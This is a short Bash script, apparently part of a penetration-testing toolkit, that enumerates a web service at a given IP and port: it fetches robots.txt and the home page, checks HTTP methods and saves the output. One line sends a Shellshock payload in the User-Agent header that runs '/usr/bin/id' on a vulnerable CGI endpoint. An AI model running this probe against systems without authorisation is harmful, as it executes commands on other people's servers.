#!/bin/bash

if [ -z ${1+x} ]; then echo "No hay IP"; exit; else IP=$1; fi
if [ -z ${2+x} ]; then echo "No hay PUERTO"; exit; else PORT=$2; fi

# Configuracion
DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
if [ ! -f $DIR/../config.sh ]; then echo "NO SE PUEDE CARGAR LA CONFIG"; exit; fi
source $DIR/../config.sh

# VARIABLES

####################
if [ -z ${REPORT+x} ]; then
    REPORT=$DIR/$IP
    if [ ! -d $REPORT ] ; then mkdir -p $REPORT; fi
fi
SERVICE_U=$(basename $DIR | awk '{print toupper($0)}')
SERVICE_L=$(basename $DIR | awk '{print tolower($0)}')
####################

# 
echo "[-] Lanzando curl robots.txt ..."
curl --silent -v http://$IP:$PORT/robots.txt -o "$REPORT/$SERVICE_U-ROBOTS_$PORT.txt" > /dev/null 2>&1 &
pids[${RANDOM}]=$!

echo "[-] Lanzando curl / ..."
curl --silent -sSik http://$IP:$PORT/ -o "$REPORT/$SERVICE_U-WEBSITE_$PORT.txt" > /dev/null 2>&1 &
pids[${RANDOM}]=$!

echo "[-] Lanzando curl (shellsock /cgi-bin/status) ..."
curl --silent -sSik -H "User-Agent: () { ignored;};/usr/bin/id 0>&1" http://$IP:$PORT/cgi-bin/status | tee "$REPORT/$SERVICE_U-SHELLSOCK_$PORT.txt" > /dev/null 2>&1 &
pids[${RANDOM}]=$!

echo "[-] Lanzando curl (HTTP Methods) ..."
curl --silent -sSik -X OPTIONS -I http://$IP:$PORT | tee "$REPORT/$SERVICE_U-HTTPMETHODS_$PORT.txt" > /dev/null 2>&1 &
pids[${RANDOM}]=$!

####################
# https://stackoverflow.com/questions/356100/how-to-wait-in-bash-for-several-subprocesses-to-finish-and-return-exit-code-0
# run processes and store pids in array
# wait for all pids
for pid in ${pids[*]}; do
    #echo "Esperando..." 
    wait $pid
done
